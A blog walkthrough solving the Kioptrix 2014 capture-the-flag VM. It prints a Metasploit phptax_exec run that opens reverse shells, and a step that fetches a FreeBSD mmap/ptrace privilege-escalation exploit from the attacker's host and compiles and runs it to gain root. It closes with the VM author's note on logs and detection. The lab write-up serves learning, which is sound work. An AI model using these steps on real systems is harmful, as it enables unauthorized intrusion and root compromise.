---
layout: blog_item
title:  "Kioptrix Level 2014 Walkthrough"
date:   2014-04-15 14:00:10
author: Arr0way
description: 'Kioptrix 2014 Walkthrough, CTF solution for Kioptrix Level 2014.'
categories: [walkthroughs]
tags:
- Kioptrix
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>

        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 8080</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</p></pc>
           </td>
        </tr>        

      </tbody>

</table>
</div>


## Web Application Interrogation

<code>http://192.168.221.159:8080/</code> rendered a page 403 forbidden page. The Firefox UserAgent switcher was leveraged to change the browser to IE 6, exposing the web application **PHPTAX** (this took a while to figure out!):


![phptax](/img/blog/kioptrix/phptax.png)

![phptax2](/img/blog/kioptrix/phptax2.png)

## Non Privileged Shell

Research discovered a metasploit module existed for phptax:

{% highlight bash %}

msf > use exploit/multi/http/phptax_exec
msf exploit(phptax_exec) > set RHOST 192.168.221.159
RHOST => 192.168.221.159
msf exploit(phptax_exec) > set RPORT 8080
RPORT => 8080
msf exploit(phptax_exec) > set TARGETURI /phptax/
TARGETURI => /phptax/
msf exploit(phptax_exec) > show options

Module options (exploit/multi/http/phptax_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      192.168.221.159  yes       The target address
   RPORT      8080             yes       The target port
   TARGETURI  /phptax/         yes       The path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   PhpTax 0.8


msf exploit(phptax_exec) > run

[*] [2016.01.07-08:20:41] Started reverse double handler
[*] [2016.01.07-08:20:41] 192.168.221.1598080 - Sending request...
[*] [2016.01.07-08:20:42] Accepted the first client connection...
[*] [2016.01.07-08:20:42] Accepted the second client connection...
[*] [2016.01.07-08:20:42] Accepted the first client connection...
[*] [2016.01.07-08:20:42] Accepted the second client connection...
[*] [2016.01.07-08:20:42] Command: echo GiSakqCyBJv7ZAuW;
[*] [2016.01.07-08:20:42] Writing to socket A
[*] [2016.01.07-08:20:42] Writing to socket B
[*] [2016.01.07-08:20:42] Reading from sockets...
[*] [2016.01.07-08:20:42] Command: echo 4yauS5V9QPhhcobv;
[*] [2016.01.07-08:20:42] Writing to socket A
[*] [2016.01.07-08:20:42] Writing to socket B
[*] [2016.01.07-08:20:42] Reading from sockets...
[*] [2016.01.07-08:20:43] Reading from socket B
[*] [2016.01.07-08:20:43] B: "GiSakqCyBJv7ZAuW\r\n"
[*] [2016.01.07-08:20:43] Matching...
[*] [2016.01.07-08:20:43] A is input...
[*] [2016.01.07-08:20:43] Reading from socket B
[*] [2016.01.07-08:20:43] B: "4yauS5V9QPhhcobv\r\n"
[*] [2016.01.07-08:20:43] Matching...
[*] [2016.01.07-08:20:43] A is input...
[*] Command shell session 1 opened (192.168.221.162:4444 -> 192.168.221.159:45072) at 2016-01-07 08:20:43 -0500
[*] Command shell session 2 opened (192.168.221.162:4444 -> 192.168.221.159:62420) at 2016-01-07 08:20:43 -0500

id
uid=80(www) gid=80(www) groups=80(www)

{% endhighlight %}

## Local Privilege Escalation

The binary <code>fetch</code> was used to download a FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit, fetch was used as the target didn't contain the usual binaries for file download (wget, curl, etc).

{% highlight bash %}

wget
wget: not found

curl
curl: not found

fetch -o exploit http://192.168.221.162:45/26368
exploit                                               2215  B   32 MBps

mv exploit exploit.c
gcc exploit.c -o exploit
./exploit

id
uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)
/bin/sh -i
sh: can't access tty; job control turned off
# cd /root
# ls
.cshrc
.history
.k5login
.login
.mysql_history
.profile
congrats.txt
folderMonitor.log
httpd-access.log
lazyClearLog.sh
monitor.py
ossec-alerts.log
# cat congrats.txt
If you are reading this, it means you got root (or cheated).
Congratulations either way...

Hope you enjoyed this new VM of mine. As always, they are made for the beginner in
mind, and not meant for the seasoned pentester. However this does not mean one
can't enjoy them.

As with all my VMs, besides getting "root" on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering & research. Anyone can throw massive amounts of exploits
and "hope" it works, but think about the traffic.. the logs... Best to take it
slow, and read up on the information you gathered and hopefully craft better
more targetted attacks.

For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won't from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".
It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".
Finding and knowing these little details will greatly help during an attack. Of course
my examples are specific for this target, but the theory applies to all systems.

As a small exercise, look at the logs and see how much noise you generated. Of course
the log results may not be accurate if you created a snapshot and reverted, but at least
it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.
Default settings, nothing fancy but it should've logged a few of your attacks. Look
at the following files:
/root/folderMonitor.log
/root/httpd-access.log (softlink)
/root/ossec-alerts.log (softlink)

The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS
for this.
The httpd-access.log is rather self-explanatory .
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
files. This one should've detected a few of your web attacks.

Feel free to explore the system and other log files to see how noisy, or silent, you were.
And again, thank you for taking the time to download and play.
Sincerely hope you enjoyed yourself.

Be good...


loneferret
http://www.kioptrix.com


p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by
default it would've blocked your IP (both in hosts.allow & Firewall) for
600 seconds. I was nice enough to remove that part :)

{% endhighlight %}

Thanks for the VM :)
